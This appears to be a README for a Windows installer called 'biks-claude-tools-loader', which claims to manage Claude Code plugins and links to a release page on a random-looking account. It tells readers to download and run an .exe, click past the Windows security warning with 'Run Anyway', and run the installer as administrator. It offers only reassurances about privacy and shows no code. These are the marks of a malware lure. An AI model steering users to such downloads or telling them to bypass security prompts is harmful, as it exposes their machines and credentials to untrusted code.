# 🛠️ biks-claude-tools-loader - Find and install Claude Code plugins

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases)

## What is this tool

Biks Claude Tools helps you manage plugins for Claude Code. You can discover new tools, connect marketplaces to your setup, and install specific plugins. This tool uses a release-workflow to keep your plugins current. It removes the manual work needed to find and add features to your workflow.

## System requirements

You need a computer running Windows 10 or Windows 11. Your system requires at least 4GB of RAM to run the interface smoothly. You also need an active internet connection to browse and download the various plugins stored in the marketplace.

## 📥 Downloading the software

You will download the installer from the official release page. 

1. Visit the [releases page](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases).
2. Look for the latest version number at the top of the list.
3. Click the file ending in .exe to start your download.
4. Save the file to your desktop or downloads folder.

The software does not require complex setup steps. It runs as a self-contained program.

## 🚀 Installing and running the program

After you download the file, follow these steps to start:

1. Locate the downloaded file on your computer.
2. Double-click the file to open the installation prompt.
3. Windows might show a security notice because the app is new. Click More Info and then select Run Anyway to continue.
4. Follow the on-screen instructions to finish the installation process.
5. Launch the application using the new icon on your desktop or start menu.

Once the program opens, you will see a dashboard. This area shows which plugins you have installed. You can also view the marketplace list here.

## Finding and adding plugins

The main window shows a list of available tools. Each item has a description and a button to install it. 

1. Browse the list to find a tool that fits your needs. 
2. Click the Install button next to the tool name.
3. Wait for the progress bar to finish.
4. The tool now appears in your active plugin list.

If a tool needs extra settings, the app will show a prompt. You can provide any necessary information in these boxes. Most tools work without extra steps.

## Managing your library

You can manage your tools at any time. The interface allows you to remove or update items easily. 

* **To update:** If an update exists for a plugin, you will see a badge on the plugin card. Click Update to fetch the latest version.
* **To remove:** Click the Options button on a plugin card and choose Remove. This deletes the plugin files from your computer and stops it from running in Claude Code.

## Solving common problems

If the app fails to open, check your internet connection first. The app needs the internet to pull the list of tools from the marketplace. If the app shows an error during installation, restart your computer and try again. 

Should you encounter a lock screen error, right-click the installation file and select Run as administrator. This often fixes permission conflicts on Windows systems.

If the plugins do not seem to show up in your IDE, verify that the path to your Claude Code configuration matches the path used by the Biks loader. You can check this in the Settings menu within the app.

## Privacy and security

This tool only connects to the official repositories mentioned in the release notes. It stores your chosen settings in a local file on your hard drive. No personal data uploads to external servers. The app communicates only with authorized endpoints to download plugin files.
